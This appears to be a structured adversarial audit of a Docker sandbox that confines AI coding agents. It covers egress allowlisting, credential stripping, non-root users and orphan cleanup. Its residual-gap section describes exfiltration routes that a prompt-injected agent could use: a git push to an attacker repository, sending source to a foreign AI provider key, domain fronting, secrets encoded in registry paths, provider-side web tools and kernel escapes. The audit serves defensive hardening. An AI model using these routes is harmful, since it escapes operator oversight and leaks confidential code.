audit_metadata.title: Adversarial audit of sandbox container/host security boundary
audit_metadata.target: Inspect actual container/host implementation and tests; attack egress, env/credential exposure, read-only surfaces, host escapes, provider-side tools, cleanup/orphans. Separate implemented guarantees from documented future hardening. Output evidence/sandbox-security-boundary.json and courts in evidence/COURTS/.

shipped_core_guarantees.boundary_name: No docker.sock, No Host FS Mounts, Lexical Channel Confinement
shipped_core_guarantees.implemented_mechanism: Task containers mount exclusively a single per-task named volume (/gnomish/work). No host filesystems or sockets (/var/run/docker.sock) are mounted. Container file channel transfers files via exec pipe ('sh -c mkdir -p ... && cat > ...') rather than 'docker cp' (preventing host tar extraction vulnerabilities). Path traversal outside /gnomish/work and /gnomish/scratch is rejected lexically, including .git/**.

Docker network created with '--internal' (no external routing, no default gateway). Egress guard runs mitmdump in non-intercepting SNI/CONNECT mode with default-deny allowlist rendered into read-only config. Mandatory fail-closed EnvironmentSelfCheck tests direct-egress failure, denied-host HTTP 403, and network internal metadata before executing gnome rounds.

shipped_core_guarantees.boundary_name: In-Box Non-Root User & Immutable Control Surfaces
shipped_core_guarantees.implemented_mechanism: The container executes under the image default user, required to be non-root. EnvironmentSelfCheck executes 'id -u' and fails closed if output is 0. Image control surfaces (/etc/gnomish, shell rc files, agent config) are root-owned and read-only to uid 1000 (gnome), preventing prompt injection from rewriting execution boundaries.

BindingResolver defaults to 'container' and rejects silent fallback to host. Repositories can only declare needs (e.g. egress-control, isolation, task-isolation) in stage manifests. SandboxReconciler enforces needs against adapter CapabilityPassport fail-closed; untrusted repo manifests cannot choose host adapter or loosen isolation. First-party trust table ratifies ServiceLoader bindings.

shipped_core_guarantees.boundary_name: Single-Branch Tagless Seed Clone & Fast-Forward Bare Harvest
shipped_core_guarantees.implemented_mechanism: Working volume seeded by throwaway helper mounting factory clone read-only; runs 'git clone --no-local --no-hardlinks --single-branch --no-tags --network none'. Box has no remote 'origin' or upstream URL. Factory harvests completed work via dedicated git fetch with strict refspec; tags created in-box are not followed (--no-tags); rewritten history is rejected (fast-forward only); hooks never enter factory clone.

Stage verification ('verify-in: fresh-box') and judge evaluations run in completely fresh containers (<key>-v, <key>-j) initialized from the attempt commit pin, discarding in-box residual processes, wrapper PATH shims, or uncommitted modifications.

shipped_core_guarantees.boundary_name: Label-Driven Lifecycle Sweep and Safe Orphan Reclamation
shipped_core_guarantees.implemented_mechanism: All Docker objects carry immutable labels: factory ownership, project identity (normalized origin hash), environment key, and mode (tracked vs manual). Sweep runs on startup and background tick. Tracked objects check tracker claim liveness: unowned running containers are stopped (preserving volume for salvage), while ancillary guards/helpers are disposed. Minimum age window (2m) protects launching containers.

shipped_core_guarantees.boundary_name: Image VOLUME tmpfs Overrides (Zero Anonymous Volumes)
shipped_core_guarantees.implemented_mechanism: Inspects image .Config.Volumes before container start; overrides all unmounted declared volume paths with ephemeral tmpfs mounts (size=64m, mode=1777), preventing anonymous, unlabelled host volume leakage.

Container child process environment has an empty base set; only image ENV plus explicit factory.sandbox.env-passthrough variables are injected via -e flags. Tracker credentials and tokens are refused at startup and stripped from composed environment.

residual_open_doors_proposals.threat_title: Allowed host is an open door for exfiltration (e.g., github.com foreign repo push)
residual_open_doors_proposals.shipped_reality: Current egress guard (EgressGuardConfig.java) operates strictly at L4/SNI/CONNECT level. It filters only destination hostname. If github.com is in the allowlist, in-box code can make arbitrary HTTP/TLS requests to any GitHub repository or API endpoint.
residual_open_doors_proposals.attack_vector: Malicious code or injected agent executes 'git push https://<token>@github.com/attacker/exfil.git' or POSTs source files to an external GitHub Gist/Issue via the allowlisted github.com hostname.
residual_open_doors_proposals.mitigation_required: L7 path, verb, and repository-scoped policy enforcement via TLS-terminating gateway/proxy (Change B).

residual_open_doors_proposals.threat_title: AI provider channel used with foreign account credentials to leak data
residual_open_doors_proposals.shipped_reality: Egress guard allows api.anthropic.com or other LLM provider domains based on hostname. mitmproxy addon sets data.ignore_connection = True, meaning TLS is unmodified and headers are uninspected.
residual_open_doors_proposals.attack_vector: An agent compromised via prompt injection supplies an attacker-controlled API key in request headers to api.anthropic.com, sending confidential source files as context to an attacker's personal Claude/OpenAI account.
residual_open_doors_proposals.mitigation_required: Local AI gateway (LiteLLM-class) acting as the single endpoint with virtual keys, budget tracking, and credential injection, stripping foreign auth headers.

residual_open_doors_proposals.threat_title: Envelope swap and domain fronting bypass SNI checks
residual_open_doors_proposals.shipped_reality: EgressGuardConfig explicitly avoids TLS interception: def tls_clienthello(data): data.ignore_connection = True. The guard inspects only the SNI hostname in the TLS ClientHello.
residual_open_doors_proposals.attack_vector: Attacker targets a CDN-hosted domain where SNI indicates an allowed domain (e.g. repo.maven.apache.org on Cloudflare/Fastly) while the inner HTTP Host header routes to an attacker-controlled origin.
residual_open_doors_proposals.mitigation_required: Full TLS termination and certificate re-signing at the guard with CA installed into container trust store.

residual_open_doors_proposals.threat_title: Provider-side web search and URL fetch bypasses guard infrastructure entirely
residual_open_doors_proposals.proposal_owner: add-sandbox-hardening (Change B groundwork in Core, NG7 in Operator Guide)
residual_open_doors_proposals.shipped_reality: The guard network boundary only monitors packets originating from the Docker container. If the LLM provider provides server-side tools (e.g. Claude Web Search, OpenAI Web Browsing), the LLM executes requests from provider data centers directly to the internet.
residual_open_doors_proposals.attack_vector: Prompt injection instructs model to invoke its native 'web_search' or 'web_fetch' tool with sensitive internal parameters or fetch arbitrary payloads from an attacker server.
residual_open_doors_proposals.mitigation_required: Disable server-side web tools at the provider API level / API key level (current operator guidance NG7), or strip server-side tool definitions at an AI gateway proxy.

residual_open_doors_proposals.threat_title: Direct upstream package downloads and data exfiltration via registry request paths
residual_open_doors_proposals.shipped_reality: When repo.maven.apache.org or registry.npmjs.org is allowlisted, containers fetch packages directly from upstream CDNs. There is no package quarantine, age cooldown, or caching depot in core.
residual_open_doors_proposals.attack_vector: 1. Data exfiltration by embedding encoded stolen secrets in HTTP GET paths to public registries. 2. Dependency confusion or immediate installation of newly-published poisoned packages (Nx s1ngularity class).
residual_open_doors_proposals.mitigation_required: Internal artifact depot proxy with mandatory minimum age cooldown (N days) and quarantine scanning.

residual_open_doors_proposals.threat_title: Weak mutual isolation of parallel tasks on shared Linux kernel / Docker VM
residual_open_doors_proposals.shipped_reality: Container isolation relies on Linux cgroups, namespaces, and standard runc seccomp filters. Kernel vulnerabilities (local privilege escalation, dirty pipe, seccomp bypasses) can potentially compromise the host or adjacent containers.
residual_open_doors_proposals.attack_vector: A zero-day Linux kernel privilege escalation exploit compiled in-box breaks container namespace isolation to reach host kernel memory.
residual_open_doors_proposals.mitigation_required: MicroVM-grade isolation (Kata Containers, Firecracker, Colima per-task VM, or gVisor sandbox runtime).

attack_test_1_direct_ip_connect.description: Attempt to open raw TCP socket to arbitrary external IP
attack_test_1_direct_ip_connect.enforcement: Kernel routing table inside container lacks default gateway; network is --internal

attack_test_2_port_53_dns_tunneling.description: Attempt direct UDP/TCP DNS queries to 8.8.8.8 bypassing proxy
attack_test_2_port_53_dns_tunneling.enforcement: Port 53 packets are unroutable on internal Docker network; tested in EgressGuardIntegrationSpec.groovy:95

attack_test_3_non_allowlisted_http_conne.description: Attempt CONNECT request to non-allowlisted destination via guard
attack_test_3_non_allowlisted_http_conne.enforcement: mitmdump returns HTTP 403 Forbidden with body 'gnomish egress guard: destination not allowlisted'; structured denial logged to stdout

attack_surface_1_egress_and_dns.residual_vulnerability: Allowlisted hosts are permitted indiscriminately without path or payload inspection.

attack_test_1_process_env_inheritance.description: Inspect in-box environment for host secrets (AWS_SECRET_ACCESS_KEY, GITHUB_TOKEN)
attack_test_1_process_env_inheritance.enforcement: Container process starts with empty base environment; only image ENV and explicit allowlisted vars passed

attack_test_2_credential_passthrough_col.description: Operator config attempts to pass tracker token in factory.sandbox.env-passthrough
attack_test_2_credential_passthrough_col.enforcement: ChildEnvAllowlist.validated() throws IllegalArgumentException at startup if passthrough names a declared credential

attack_surface_3_read_only_surfaces_and_.mechanism: Non-root container user + root-owned control files

attack_test_1_agent_config_tampering.description: In-box process attempts to modify /etc/gnomish/agent.toml or shell configs to inject post-run hooks
attack_test_1_agent_config_tampering.enforcement: Files are chown root:root chmod 0644; container runs as gnome (uid 1000); verified in ContainerReadOnlySurfacesSpec.groovy:97

attack_test_2_root_container_default.description: Image configured with root user (uid 0) to bypass file permissions
attack_test_2_root_container_default.enforcement: EnvironmentSelfCheck.probeRunsAsNonRoot() verifies id -u != 0 and fails closed with SelfCheckFailedException

attack_surface_4_host_escape_and_docker_.mechanism: Absence of docker.sock mount, pure command builder, tmpfs volume overrides

attack_test_1_docker_socket_mounting.description: Check if /var/run/docker.sock or CRI sockets are mounted into the container
attack_test_1_docker_socket_mounting.enforcement: DockerCommands.runContainer argv mounts strictly FactoryDockerLabels.volumeName:workingCopy; no socket mounts exist

attack_test_2_channel_path_traversal.description: Attempt to read or write ../../../etc/shadow or .git/hooks/pre-commit via putFile/readFile
attack_test_2_channel_path_traversal.enforcement: ContainerFileChannel.validate() normalizes path and asserts startsWith(workingCopy) or startsWith(scratch) and forbids .git/**

attack_test_3_anonymous_volume_leakage.description: Image Dockerfile VOLUME directive generates unlabelled host volume
attack_test_3_anonymous_volume_leakage.enforcement: DeclaredVolumeOverrides intercepts image volumes and mounts them as tmpfs (64MB, mode 1777)

attack_surface_5_provider_side_tools.mechanism: None in core (Interim operational rule NG7)
attack_surface_5_provider_side_tools.evaluation: CRITICAL RESIDUAL GAP: In-box model calls to LLM provider APIs with server-side tools enabled bypass all local network controls. Model can query external web URLs through Anthropic/OpenAI infrastructure without crossing the mitmdump egress guard.

attack_test_1_cross_project_interference.description: Sweep running for Project A attempts to remove containers of Project B on shared Docker daemon
attack_test_1_cross_project_interference.enforcement: Docker labels filter objects by com.github.oinsio.gnomish.project = <normalized-origin-hash>; external projects are excluded from listing

attack_test_2_launch_window_race_conditi.description: Reaper attempts to delete container that was just created but not yet registered in tracker
attack_test_2_launch_window_race_conditi.enforcement: Minimum age threshold (default 2m) preserves any object younger than grace window

attack_test_3_hung_instance_salvage_prot.description: Dead instance leaves unpushed work in container volume
attack_test_3_hung_instance_salvage_prot.enforcement: Tracked unowned running containers are stopped rather than destroyed; volumes retained for sibling salvage
